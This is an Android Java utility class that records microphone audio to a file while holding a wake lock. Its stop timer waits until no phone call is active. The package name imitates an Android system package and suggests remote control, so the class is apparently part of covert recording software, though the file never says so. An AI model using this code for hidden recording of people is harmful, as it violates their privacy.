package com.android.system.controled.util;

import java.io.File;
import java.io.IOException;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.system.controled.Debug;

@SuppressLint({ "Wakelock", "InlinedApi" })
public class RecorderUtil {

	private static RecorderUtil mRecorderUtil;
	private MediaRecorder mRecorder;
	private boolean isRecording;

	private WakeLock wakeLock;
	private Context mContext;

	private Handler mHandler;
	private static final int MSG_HANDLER_STOP = 0x555;
	private static final int MSG_HANDLER_STOP_MAX_TIME = 0x556;

	private static final int RECORDER_MAX_TIME = 6000000;// 100 * 60 * 1000

	private RecorderUtil() {
	}

	public static RecorderUtil getInstence(Context context) {

		if (mRecorderUtil == null) {
			mRecorderUtil = new RecorderUtil();
			mRecorderUtil.mContext = context;
			mRecorderUtil.wakeLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RecorderUtil");
		}

		return mRecorderUtil;
	}

	public boolean startRecorder(File saveFile, int timeMinute) {

		if (isRecording) {
			Debug.e("", "正在录音，务须再录！");
			return false;
		}

		Debug.e("", "startRecorder=" + saveFile.getAbsolutePath());
		boolean result = false;
		try {
			if (mRecorder == null) {
				mRecorder = new MediaRecorder();
			}

			mRecorder.reset();
			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

			mRecorder.setAudioSamplingRate(44100);// 22050
			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

			// mRecorder.setAudioSamplingRate(8000);//16000
			// mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
			// mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_WB);//MediaRecorder.AudioEncoder.AMR_NB与16000对应

			mRecorder.setOutputFile(saveFile.getAbsolutePath());

			if (timeMinute > 0) {
				// mRecorder.setMaxDuration(timeMinute * 60 * 1000);
				mHandler = new Mainhandler();
				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP, timeMinute * 60000);
				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP_MAX_TIME, RECORDER_MAX_TIME);
			}

			if (!saveFile.getParentFile().exists()) {
				saveFile.getParentFile().mkdir();
			}
			// if (!file.exists()) {
			// file.createNewFile();
			// }
			mRecorder.setOutputFile(saveFile.toString());
			mRecorder.prepare();
			mRecorder.start();
			result = true;
			isRecording = true;
			wakeLock.acquire();
		} catch (Exception e) {
			mHandler.removeMessages(MSG_HANDLER_STOP);
			mHandler.removeMessages(MSG_HANDLER_STOP_MAX_TIME);
			mRecorder.reset();
			mRecorder.release();
			mRecorder = null;
			wakeLock.release();
			if (saveFile.exists()) {
				saveFile.delete();
			}
			e.printStackTrace();
		}

		return result;
	}

	public void stopRecorder() {
		Debug.e("", "stopRecorder");
		if (mRecorder != null) {
			try {
				if (wakeLock != null) {
					wakeLock.release();
				}
				isRecording = false;
				mRecorder.stop();
				mRecorder.reset();
				mRecorder.release();
				mRecorder = null;
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			try {
				mHandler.removeMessages(MSG_HANDLER_STOP);
				mHandler.removeMessages(MSG_HANDLER_STOP_MAX_TIME);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

	private class Mainhandler extends Handler {

		TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);

		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			switch (msg.what) {
			case MSG_HANDLER_STOP:

				if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE && isRecording) {
					stopRecorder();
				}
				break;
			case MSG_HANDLER_STOP_MAX_TIME:

				if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE && isRecording) {
					stopRecorder();
				}
				break;
			default:
				break;
			}
		}

	}

	// mRecorder.setOnInfoListener(new OnInfoListener() {
	//
	// @Override
	// public void onInfo(MediaRecorder mr, int what, int extra) {
	// switch (what) {
	// case MediaRecorder.MEDIA_RECORDER_INFO_UNKNOWN:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_UNKNOWN");
	// break;
	// case MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED");
	// break;
	// case MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED:
	// Debug.e("", "MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED");
	// break;
	// default:
	// break;
	// }
	//
	// }
	// });
}
